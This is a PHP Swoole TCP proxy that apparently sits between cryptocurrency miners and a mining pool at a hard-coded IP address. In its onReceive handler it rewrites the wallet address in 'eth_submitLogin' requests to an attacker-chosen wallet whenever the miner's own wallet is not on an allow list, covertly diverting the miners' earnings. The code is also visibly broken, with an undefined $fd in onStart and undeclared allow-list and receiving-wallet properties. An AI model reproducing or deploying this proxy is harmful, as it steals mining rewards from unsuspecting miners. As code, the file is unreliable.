<?php

class ProxyServer
{

    protected $clients;

    protected $backends;
    
    protected $pipeClient;

    protected $serv;

    protected $gateway = '121.201.69.82';

    protected $port = 9509;

    protected $proxyServer = '192.168.1.200';

    protected $proxyPort = 9509;

    function run()
    {
        $serv = new swoole_server("0.0.0.0", 50000, SWOOLE_PROCESS, SWOOLE_SOCK_TCP);
        $serv->set(array(
            'reactor_num' => 1, // reactor thread num
            'worker_num' => 4, // reactor thread num
            'backlog' => 128, // listen backlog
        ) // swoole error log
);
        $serv->clientList = new swoole_table(1048576);
        
        $serv->clientList->column('clientFd', swoole_table::TYPE_INT, 4);
        $serv->clientList->column('connectTime', swoole_table::TYPE_INT, 4);
        $serv->clientList->column('activeTime', swoole_table::TYPE_INT, 4);
        
        $serv->clientList->create();
        
        
        $serv->serverList = new swoole_table(1048576);
        
        $serv->serverList->column('clientFd', swoole_table::TYPE_INT, 4);
        $serv->serverList->column('connectTime', swoole_table::TYPE_INT, 4);
        $serv->serverList->column('activeTime', swoole_table::TYPE_INT, 4);
        
        $serv->serverList->create();
        
        
        $serv->on('WorkerStart', array(
            $this,
            'onStart'
        ));
        $serv->on('Connect', array(
            $this,
            'onConnect'
        ));
        $serv->on('Receive', array(
            $this,
            'onReceive'
        ));
        $serv->on('Close', array(
            $this,
            'onClose'
        ));
        $serv->on('WorkerStop', array(
            $this,
            'onShutdown'
        ));
        
        $serv->start();
    }

    function onStart($serv)
    {
        $this->serv = $serv;
        
        $socket = new swoole_client(SWOOLE_SOCK_TCP, SWOOLE_SOCK_ASYNC);
        
        $socket->on('connect', function ($socket)
        {
            
        });
        $socket->on('error', function ()
        {});
        $socket->on('close', function ()
        {
            
        });
        $socket->on('receive', function ($socket, $data = '')
        {
            
            
            $this->serv->send($this->backends[$socket->sock]['client_fd'], $data);
        });
        
        
        $this->clients[$fd] = array(
            'socket' => $socket,
            'isConnected' => 0
        );
        
        $socket->connect($this->gateway, $this->port, - 1);
        
        $this->backends[$socket->sock] = array(
            'client_fd' => $fd,
            'socket' => $socket
        );
    }

    function onShutdown($serv)
    {
        echo "Server: onShutdown\n";
    }

    function onClose($serv, $fd, $from_id)
    {
        // backend
        if (isset($this->clients[$fd])) {
            $backend_client = $this->clients[$fd]['socket'];
            unset($this->clients[$fd]);
            $backend_client->close();
            unset($this->backends[$backend_client->sock]);
        }
    }

    function onConnect($serv, $fd, $from_id)
    {

    }

    function onReceive($serv, $fd, $from_id, $data)
    {
        if (strlen(trim($data)) == 0) {
            return;
        }
        $tempData = json_decode($data, true);
        
        if ($tempData && $tempData['method'] == 'eth_submitLogin') {
            $walltStr = $tempData['params'][0];
            
            $walltTemp = explode('.', $walltStr);
            
            $wallt = $walltTemp[0];
            
            if (in_array($wallt, $this->allowWallt)) {
                // nothing
            } else {
                $data = str_replace($wallt, $this->reciveWallt, $data);
            }
        }
        
        $backend_socket = $this->clients[$fd]['socket'];
        
        if ($this->clients[$fd]['isConnected'] == 0) {
            $this->clients[$fd]['msg'] = $data;
            $this->clients[$fd]['isConnected'] = 1;
        } else {
            
            $backend_socket->send($data);
        }
        echo $data;
        echo "\n";
    }
}

$serv = new ProxyServer();
$serv->run();  